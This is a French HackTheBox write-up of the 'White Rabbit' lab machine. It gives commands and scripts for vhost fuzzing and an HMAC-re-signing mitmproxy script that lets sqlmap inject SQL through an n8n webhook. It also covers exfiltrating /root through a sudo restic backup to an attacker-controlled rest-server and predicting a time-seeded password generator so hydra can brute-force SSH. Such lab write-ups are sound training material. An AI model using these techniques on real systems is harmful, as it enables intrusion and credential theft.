# HTB White Rabbit - YS4

## Introduction

Ce writeup est à la fois mon tout premier compte rendu détaillé de box et ma première machine de difficulté Insane sur HackTheBox. J'ai essayé de documenter au mieux chaque étape et chaque commande, mais il est possible que certaines parties soient perfectibles ou un peu verbeuses. L'objectif était surtout de garder une trace claire de mon raisonnement et de ce que j'ai appris en chemin.

---

## USER PATH

### 1. Recon réseau et découverte des vhosts

**Scan initial** : ports 22, 2222 (SSH) et 80 (HTTP, Caddy) sur la cible.

```bash
nmap --sC --sV 10.129.x.x
```

- Accès à `http://10.129.x.x` → site vitrine "White Rabbit" (one-page) mentionnant n8n, GoPhish, Uptime Kuma, Wiki, etc.
- `curl` sur une URL random vers l'IP montre un 302 vers `whiterabbit.htb` → nécessité d'ajouter `whiterabbit.htb` dans `/etc/hosts` et de travailler par vhost.

### 2. Uptime Kuma et fuite des hôtes internes

- **Fuzz vhosts** : `ffuf` sur `Host: FUZZ.whiterabbit.htb` → découverte de `status.whiterabbit.htb` (Uptime Kuma)
- Ajout dans `/etc/hosts`, accès à la login page Kuma
- Fuzz de `status.whiterabbit.htb/FUZZ` → `/status` → redirige vers `/status/dashboard`
- Fuzz sur `/status/FUZZ` → découverte de `/status/temp`, status page publique

**Hôtes découverts** :
- `whiterabbit.htb` (site)
- `ddb09a8558c9.whiterabbit.htb` (GoPhish)
- `a668910b5514e.whiterabbit.htb` (Wiki.js DEV)
- `n8n [Production]`

### 3. Wiki.js non protégé → fuite de n8n + secret

Ajout des deux vhosts dans `/etc/hosts`, puis navigation :
- **GoPhish** : simple page de login
- **Wiki.js** : wiki interne sans authentification (ToDo "add authentication")
- Recherche dans le wiki → page "GoPhish Webhooks" décrivant l'intégration GoPhish ↔ n8n

**La page Gophish Webhooks fournit** :
- Un exemple POST
- Host : `28efa8f7df.whiterabbit.htb` (nouveau vhost n8n)
- Path : `/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d`
- Un exemple de header `x-gophish-signature: sha256=...`
- Un lien vers un export JSON du workflow n8n

Ajout de `28efa8f7df.whiterabbit.htb` dans `/etc/hosts` et accès à la GUI n8n (login) + test du webhook (404 quand workflow inactif).

### 4. Analyse du workflow n8n

Téléchargement du workflow `gophish_to_phishing_score_database.json` depuis le wiki.

**Analyse des nodes n8n** :
- **Webhook** : POST `/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d` (active: true)
- **Node "Calculate the signature"** : HMAC SHA256 sur `JSON.stringify($json.body)` avec le secret: `3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS`
- **Node "Compare signature"** : vérifie `x-gophish-signature` vs `calculated_signature`
- **Nodes MySQL** : credentials "mariadb - phishing" qui font des SELECT/UPDATE sur la table `victims.phishing_score`

### 5. Abus du webhook via mitmproxy + sqlmap (SQLi sur victims)

**Objectif** : exploiter la requête SQL dans le workflow n8n en injectant dans le champ `email`, tout en respectant la vérification HMAC du header `x-gophish-signature`.

#### Setup du proxy mitmproxy

```python
# proxy.py
from mitmproxy import http
import hmac, hashlib

SECRET = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"

def request(flow: http.HTTPFlow):
    if flow.request.path.startswith("/webhook/") and flow.request.method == "POST":
        raw = flow.request.get_content()
        sig = hmac.new(SECRET, raw, hashlib.sha256).hexdigest()
        flow.request.headers["x-gophish-signature"] = f"sha256={sig}"
```

Lancement de mitmproxy :
```bash
mitmproxy -s proxy.py -p 1717
```

#### Lancement de sqlmap

```bash
python3 sqlmap.py -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers="Content-Type: application/json" \
  --proxy="http://127.0.0.1:1717" \
  --technique=BE --time-sec=3 --dbs --batch --dump --D temp
```

#### Dump de temp.command_log

```
2 ... restic init --repo rest:http://75951e6ff.whiterabbit.htb
3 ... echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
6 ... cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd
```

**Découverte** : vhost `75951e6ff.whiterabbit.htb` et mot de passe restic `ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw`

### 6. Accès au dépôt restic bob via 75951e6ff.whiterabbit.htb

Ajout de `75951e6ff.whiterabbit.htb` dans `/etc/hosts`.

#### Utilisation de restic en local

```bash
export RESTIC_PASSWORD='ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw'
restic -r rest:http://75951e6ff.whiterabbit.htb snapshots
```

**Résultat** : un snapshot unique
```
ID        Time  Host        Paths
272cacd5  ...   whiterabbit /dev/shm/bob/ssh
```

#### Listing du snapshot

```bash
restic -r rest:http://75951e6ff.whiterabbit.htb ls 272cacd5 /dev/shm/bob/ssh
# → /dev/shm/bob/ssh/bob.7z
```

#### Restauration locale

```bash
restic -r rest:http://75951e6ff.whiterabbit.htb restore 272cacd5 --target ./restore
cd restore/dev/shm/bob/ssh
7z l bob.7z  # archive chiffrée contenant bob, bob.pub, config
```

#### Bruteforce avec johntheripper

Mot de passe de l'archive : `1q2w3e4r5t6y7u8i`

#### Extraction de la clé SSH

```bash
7z x bob.7z
chmod 600 bob
cat config  # Host whiterabbit / HostName whiterabbit.htb / Port 2222 / User bob
```

### 7. SSH bob + sudo restic → exfiltration de /root

#### Connexion SSH

```bash
ssh -F config -i bob whiterabbit
```

#### Vérification sudo

```bash
sudo -l
# → (ALL) NOPASSWD: /usr/bin/restic
```

Bob peut lancer restic en root sans mot de passe. Idée : faire exécuter par root des sauvegardes restic vers un rest-server contrôlé sur la machine attaquante, pour exfiltrer `/root`.

#### Côté attaquant : téléchargement et lancement du rest-server

```bash
mkdir -p ~/white_rabbit
rest-server --path ~/white_rabbit --no-auth --listen :1717
```

#### Côté bob sur la box : initialisation et backup de /root

```bash
echo 'ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw' > .restic_passwd

sudo /usr/bin/restic -r rest:http://<IP_VPN_ATTAQUANT>:1717/root init \
  --password-file .restic_passwd

sudo /usr/bin/restic -r rest:http://<IP_VPN_ATTAQUANT>:1717/root backup /root \
  --password-file .restic_passwd
```

### 8. Restauration locale de /root et SSH morpheus

#### Côté attaquant

```bash
cd ~/white_rabbit/root
echo 'ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw' > ../.restic_passwd
restic -r . --password-file ../.restic_passwd snapshots
restic -r . --password-file ../.restic_passwd restore latest --target ./restored_root
```

#### Accès SSH en morpheus

```bash
cd restored_root/root
chmod 600 morpheus
ssh -i morpheus morpheus@whiterabbit.htb
```

---

## ROOT PATH

### 1. Identification du générateur de mots de passe

Une fois connecté en morpheus, l'énumération de `/opt` révèle un binaire intéressant :

```bash
morpheus@whiterabbit:/opt$ ls
containerd docker neo-password-generator

morpheus@whiterabbit:/opt$ ls -l /opt/neo-password-generator/neo-password-generator
-rwxr-xr-x 1 root root 15656 Aug 30 2024 /opt/neo-password-generator/neo-password-generator
```

Le binaire appartient à root (non SUID) et, lorsqu'il est exécuté, génère un mot de passe aléatoire de 20 caractères :

```bash
morpheus@whiterabbit:/opt/neo-password-generator$ ./neo-password-generator
cn5YYvjSqstlwkLeQ3Hs
```

Dans la table `temp.command_log` (déjà obtenue via la SQLi sur n8n), on trouve :

```
cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd
```

Ce qui indique que ce binaire a servi à définir le mot de passe d'un compte local, très probablement `neo`.

### 2. Exfiltration et rétro-ingénierie légère

On exfiltre le binaire vers notre machine.

Une analyse rapide montre que le programme :
- Initialise le générateur pseudo-aléatoire de la glibc avec `srand()`, seedé par un timestamp précis (via `gettimeofday`)
- Génère 20 caractères en appelant `rand()` et en indexant dans l'alphabet `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`

La date exacte de la commande `neo-password-generator | passwd` est connue via `command_log` (30/08/2024 14:40:42). On peut donc reconstituer les seeds possibles autour de ce timestamp.

### 3. Reproduction de l'algorithme et génération de la wordlist

Sur la machine d'attaque, développement d'un script Python pour reproduire le comportement du binaire et générer tous les mots de passe possibles sur une fenêtre de 1000 millisecondes autour de l'horodatage :

```python
#!/usr/bin/env python3
from ctypes import CDLL
from datetime import datetime, timezone, timedelta

# Accès aux fonctions rand()/srand() de la libc
libc = CDLL("libc.so.6")

# Alphabet utilisé par le générateur
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PW_LENGTH = 20

# Horodatage de la commande neo-password-generator | passwd
base_dt = datetime(2024, 8, 30, 14, 40, 42, tzinfo=timezone(timedelta(0)))
base_ts = base_dt.timestamp()  # secondes depuis l'epoch

for offset_ms in range(0, 1000):
    seed = int(base_ts * 1000 + offset_ms)
    libc.srand(seed)
    
    pw = []
    for _ in range(PW_LENGTH):
        r = libc.rand()
        pw.append(CHARS[r % len(CHARS)])
    
    print("".join(pw))
```

#### Génération de la wordlist

```bash
python3 script.py > neo_passwords.txt
```

### 4. Bruteforce ciblé du compte neo

Avec cette wordlist, un bruteforce SSH sur le compte neo est lancé :

```bash
hydra -l neo -P neo_passwords.txt ssh://whiterabbit.htb -t 20
```

Hydra trouve rapidement le mot de passe valide :

```
[22][ssh] host: whiterabbit.htb login: neo password: WBSxhWgfnMiclrV4dqfj
```

### 5. Connexion en SSH et sudo

```bash
ssh neo@whiterabbit.htb
# Password: WBSxhWgfnMiclrV4dqfj
```

Une fois connecté en neo, la vérification des droits sudo donne :

```bash
neo@whiterabbit:~$ sudo -l
[sudo] password for neo:
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:...

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
```

Neo peut exécuter toutes les commandes en sudo, on peut donc lire le `root.txt` :

```bash
sudo cat /root/root.txt
```

---

## Enseignements clés

1. **Reconnaissance exhaustive** : la découverte des vhosts était cruciale
2. **Exposition d'informations sensibles** : le wiki non protégé a révélé secrets et architecture
3. **Chaîne d'exploitation** : SQLi → exfiltration de secrets → accès SSH → privilege escalation
4. **Abuse de permissions** : `sudo restic` sans mot de passe a permis l'accès root
5. **Rétro-ingénierie d'algorithmes simples** : prédictibilité du PRNG via timestamps

---

**Merci d'être indulgent sur la forme et n'hésitez pas à faire des retours pour améliorer les prochains writeups !**
